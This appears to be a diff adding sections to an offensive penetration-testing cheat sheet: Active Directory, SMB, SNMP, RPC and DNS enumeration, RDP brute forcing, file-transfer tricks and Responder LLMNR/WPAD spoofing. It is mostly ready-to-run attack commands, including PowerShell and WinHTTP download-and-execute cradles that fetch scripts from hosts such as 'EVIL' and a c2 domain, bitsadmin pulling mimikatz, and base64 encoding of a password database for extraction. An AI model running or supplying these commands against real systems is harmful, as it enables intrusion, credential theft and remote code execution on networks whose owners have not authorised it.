@@ -137,3 +137,280 @@ php -S 0.0.0.0:80
 
 ```
 
+#### SharpView Enumeration
+
+```bash
+#https://github.com/tevora-threat/SharpView
+
+Get-DomainFileServer
+Get-DomainGPOUserLocalGroupMapping
+Find-GPOLocation
+Get-DomainGPOComputerLocalGroupMapping
+Find-GPOComputerAdmin
+Get-DomainObjectAcl
+Get-ObjectAcl
+Add-DomainObjectAcl
+Add-ObjectAcl
+Remove-DomainObjectAcl
+Get-RegLoggedOn
+Get-LoggedOnLocal
+Get-NetRDPSession
+Test-AdminAccess
+Invoke-CheckLocalAdminAccess
+Get-WMIProcess
+Get-NetProcess
+Get-WMIRegProxy
+Get-Proxy
+Get-WMIRegLastLoggedOn
+Get-LastLoggedOn
+Get-WMIRegCachedRDPConnection
+Get-CachedRDPConnection
+Get-WMIRegMountedDrive
+Get-RegistryMountedDrive
+Find-InterestingDomainAcl
+Invoke-ACLScanner
+Get-NetShare
+Get-NetLoggedon
+```
+
+#### SMB Enumeration
+
+```bash
+nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
+enum4linux 1.3.3.7
+smbmap -H 1.3.3.7
+smbclient -L \\INSERTIPADDRESS
+smbclient -L INSERTIPADDRESS
+smbclient //INSERTIPADDRESS/tmp
+smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
+smbclient //INSERTIPADDRESS/ipc$ -U john
+smbclient //INSERTIPADDRESS/admin$ -U john
+nbtscan [SUBNET]
+
+
+#Check for SMB Signing
+nmap --script smb-security-mode.nse -p 445 10.10.14.14
+```
+
+#### SNMP Enumeration
+
+```bash
+snmpwalk -c public -v1 10.10.14.14
+snmpcheck -t 10.10.14.14 -c public
+onesixtyone -c names -i hosts
+nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt
+snmpenum -t 10.10.14.14
+```
+
+#### MySQL Enumeration
+
+```bash
+nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
+```
+
+#### DNS Zone Transfer
+
+```bash
+dig axfr blah.com @ns1.m0chan.com
+nslookup -> set type=any -> ls -d m0chan.com
+dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
+```
+
+#### LDAP
+
+```bash
+ldapsearch -H ldap://<ip>
+ldapwhoami
+```
+
+#### RPC Enumeration
+
+```bash
+rpcclient -U "10.10.14.14"
+srvinfo
+enumdomusers
+enumalsgroups domain
+lookupnames administrators
+querydominfo
+enumdomusers
+queryuser <user>
+lsaquery
+lookupnames Guest
+lookupnames Administrator
+```
+
+#### Remote Desktop
+
+```bash
+rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
+
+# Brute force
+ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
+hydra
+medusa
+and so on
+```
+
+### File Transfer
+
+#### TFTP
+
+```bash
+m0chan Machine
+mkdir tftp
+atftpd --deamon --port 69 tftp
+cp *file* tftp
+On victim machine:
+tftp -i <[IP]> GET <[FILE]>
+```
+
+#### FTP
+
+```bash
+echo open <[IP]> 21 > ftp.txt
+echo USER demo >> ftp.txt
+echo ftp >> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+```
+
+#### VBS Script
+
+```bash
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+
+
+cscript wget.vbs <url> <out_file>
+
+Use echoup function on pentest.ws to generate echo commands.
+https://pentest.ws/features
+```
+
+#### Powershell
+
+```bash
+#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles
+
+Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
+
+(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
+
+#Powershell Download to Memory
+
+IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
+
+#Powershell with Proxy
+
+$browser = New-Object System.Net.WebClient;
+$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString('https://server/script.ps1'));
+```
+
+#### Powershell Base64
+
+```bash
+$fileName = "Passwords.kdbx"
+$fileContent = get-content $fileName
+$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
+$fileContentEncoded | set-content ($fileName + ".b64")
+```
+
+#### Secure Copy / pscp.exe
+
+```bash
+pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
+pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
+```
+
+#### BitsAdmin.exe
+
+```bash
+cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe & start C:\Temp\binary.exe"
+```
+
+#### Remote Desktop
+
+```bash
+rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
+```
+
+#### WinHTTP Com Object
+
+```bash
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+```
+
+#### CertUtil
+
+```bash
+#File Transfer
+
+certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename
+```
+
+#### CertUtil Base64 Transfers
+
+```bash
+certutil.exe -encode inputFileName encodedOutputFileName
+certutil.exe -decode encodedInputFileName decodedOutputFileName
+```
+
+#### Curl \(Windows 1803+\)
+
+```text
+curl http://server/file -o file
+curl http://server/file.bat | cmd
+
+IEX(curl http://server/script.ps1);Invoke-xxx
+```
+
+#### SMB
+
+```bash
+python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
+Exploit
+```
+
+### Exploit
+
+#### LLMNR / NBT-NS Spoofing
+
+```bash
+git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0
+```
+
+![-w1673](https://cdn.nlark.com/yuque/0/2019/jpeg/370919/1570366728253-f76d3f21-19d8-475c-84e0-1ccfadf599b3.jpeg)￼
+
+#### Responder WPAD Attack
+
+```bash
+responder -I eth0 wpad
+```
